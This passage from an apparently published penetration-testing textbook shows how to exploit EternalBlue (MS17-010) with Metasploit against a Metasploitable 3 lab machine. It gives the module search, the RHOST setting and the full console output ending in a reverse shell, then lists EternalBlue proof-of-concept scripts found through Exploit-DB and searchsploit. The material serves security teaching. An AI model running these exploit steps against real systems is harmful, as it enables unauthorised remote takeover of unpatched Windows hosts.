
exploit modules in Metasploit, though the number changes fairly regularly because of the popularity of the software and the development work by Rapid7.

Metasploit makes the work of exploiting considerably easier than going through the process of creating an exploit by hand, assuming Metasploit has an exploit available. If they don't, you'll be forced to do one by hand if you can. We're going to use the command line for this, though there are other options, like a web interface if you get the package from Rapid7. The CLI exposes everything that's happening. We're going to start with the msfconsole program. There are multiple ways of acquiring Metasploit, but for this, I'm just using an instance of Kali Linux, which has Metasploit installed by default. All I needed to do was set up the database that is used to store information about hosts, vulnerabilities, and any loot acquired. In the following listing, you can see starting up msfconsole, which is the command-line program used to interact with Metasploit.

## Starting msfconsole

```
root@quiche:~# msfconsole
```

![](img/421171b17a0c0dfae0aacde15d9831c1_272_0.png)

```
= [ metasploit v4.17.8-dev ]
+ -- --=[ 1803 exploits - 1027 auxiliary - 311 post ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
```

```
msf >
```

Once msfconsole is started, we need to locate an exploit for a vulnerability that has been identified. There is a Windows Server on my home network that I'm going to use for the purpose of demonstrating exploitation. This is a Metasploitable 3 instance, so there are several vulnerable services that have been built into it, making it perfect to demonstrate with and practice on. In order to find an exploit, we can search for it. You'll see in the following listing a search for a module that will run the EternalBlue exploit, which takes advantage of the vulnerability described in CVE-2017-0144. There are several matches for this search. We could narrow the scope with some additional parameters, like specifying the type using type:exploit, for example. This may be useful if you have a very long list of results and you need to make it easier to identify the right one.

## Searching Metasploit

```
msf > search eternalblue

Matching Modules
================

Name                                                   Disclosure Date       Rank    Description
----                                                   -------------       -----   -----------
auxiliary/admin/smb/ms17_010_command                   2017-03-14            normal  MS17-010
EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
auxiliary/scanner/smb/smb_ms17_010                                             normal  MS17-010 SMB RCE Detection
exploit/windows/smb/ms17_010_eternalblue               2017-03-14            average MS17-010 EternalBlue SMB Remote
Windows Kernel Pool Corruption
exploit/windows/smb/ms17_010_eternalblue_win8          2017-03-14            average MS17-010 EternalBlue SMB Remote
Windows Kernel Pool Corruption for Win8+
exploit/windows/smb/ms17_010_psexec                    2017-03-14            normal  MS17-010 EternalRomance/
EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

There is more than one that we could use here, depending on what we want to accomplish. In this case, I want to get a shell on the remote system; the auxiliary module will allow us to execute a single command on the remote system, which would be the same as the one ending in psexec. As a result, we're going to use the exploit ending in 010_eternalblue, as you can see in the next code listing. This will give us a shell on the remote host. From that shell, we can start issuing commands, but more than just one, which the others would let us do.

Once we know what module we are using, we load it up using the use command in msfconsole. Each module has a set of options that can or need to be set. In some cases, the options will have defaults already set so you don't need to do anything. The one parameter that will always need to be set is the one for the target. This will either be RHOST or RHOSTS, depending on whether the module expects to have multiple targets. A scanner module, for example, will use RHOSTS, while an exploit module will generally have RHOST as the parameter name. In the following code listing, we need to set RHOST with the IP address of the target of our exploit attempt. As expected, the exploit was successful, giving us remote access to the target system.

## EternalBlue exploit

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.86.24
RHOST => 192.168.86.24
msf exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.86.57:4444
[*] 192.168.86.24:445 - Connecting to target for exploitation.
[+] 192.168.86.24:445 - Connection established for exploitation.
[+] 192.168.86.24:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.86.24:445 - CORE raw buffer dump (51 bytes)
[*] 192.168.86.24:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.86.24:445 - 0x00000010  30 30 38 20 52 20 53 74 61 6e 64 61 72 64 20 00  008 R2 Standard
[*] 192.168.86.24:445 - 0x00000020  57 37 36 31 30 20 53 65 72 76 69 63 65 50 61 63  k 1
[*] 192.168.86.24:445 - 0x00000030  6b 20 30 20 31
[+] 192.168.86.24:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.86.24:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.86.24:445 - Sending all but last fragment of exploit packet
[*] 192.168.86.24:445 - Starting non-paged pool grooming
[+] 192.168.86.24:445 - Sending SMBv2 buffers
[+] 192.168.86.24:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.86.24:445 - Sending final SMBv2 buffers.
[*] 192.168.86.24:445 - Sending last fragment of exploit packet!
[*] 192.168.86.24:445 - Receiving response from exploit packet
[+] 192.168.86.24:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.86.24:445 - Sending egg to corrupted connection.
[*] 192.168.86.24:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (192.168.86.57:4444 -> 192.168.86.24:50371) at 2018-08-31 19:52:40 -0600
[+] 192.168.86.24:445 - ====================
[+] 192.168.86.24:445 -        -WIN-
[+] 192.168.86.24:445 - ====================
```

Not every vulnerability is as successful as this one. When you search for a module, you will get a ranking that indicates to you how successful the exploit is likely to be. Vulnerabilities are not always straightforward. In some cases, there may be dependencies that need to be in place before the vulnerability can be exploited. You may need to try the exploit multiple times before it succeeds. If it were easy and straightforward, after all, everyone would be able to do it, which might mean more security testing was getting done, which in turn may lead to fewer bugs in software.

## Exploit-DB

You can search exploit-db.com for exploits associated with vulnerabilities. For example, we were working with the EternalBlue exploit, which we know has a module in Metasploit. We can search exploit-db.com for modules that relate to the EternalBlue vulnerability. In Figure 7.2, you can see the results of that search. This shows three results that fall into Windows-related categories. These are all proof of concept Python scripts that you can download and run.

### FIGURE 7.2 Exploit-DB search results

| Date | V | Title | Type | Platform | Author |
|---|---|---|---|---|---|
| 2017-07-11 | | Microsoft Windows Windows 7/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | Remote | Windows | sleepya |
| 2017-05-17 | | Microsoft Windows Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | Remote | Windows | sleepya |
| 2017-05-17 | | Microsoft Windows Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010) | Remote | Windows_x64 | sleepya |

If you have the Exploit-DB package installed on your system, meaning you have searchsploit to use, you could just run searchsploit to do the same search. The Exploit-DB repository includes exploits and shellcodes, so the results don't include papers like the ones you get from the website. Instead, you just get the list of exploit code. Additionally, you are not required to download or look at the code in a web browser because you have the code downloaded already. In the following code listing, you can see the results of the search. What we get is the list of three exploit programs but no shellcode results. This isn't especially surprising because there is no shellcode especially associated with EternalBlue. Instead, it's just a vulnerability in the implementation of the Server Message Block (SMB) protocol.

### searchsploit results for EternalBlue

```
root@quiche:~# searchsploit "eternal blue"
----------------------------------------
Exploit Title | Path
| (/usr/share/exploitdb/)
----------------------------------------
Microsoft Windows Windows 7/2008 R2 (x | exploits/windows_x86-64/remote/42031.py
Microsoft Windows Windows 7/8.1/2008 R | exploits/windows/remote/42315.py
Microsoft Windows Windows 8/8.1/2012 R | exploits/windows_x86-64/remote/42030.py
----------------------------------------
Shellcodes: No Result
```
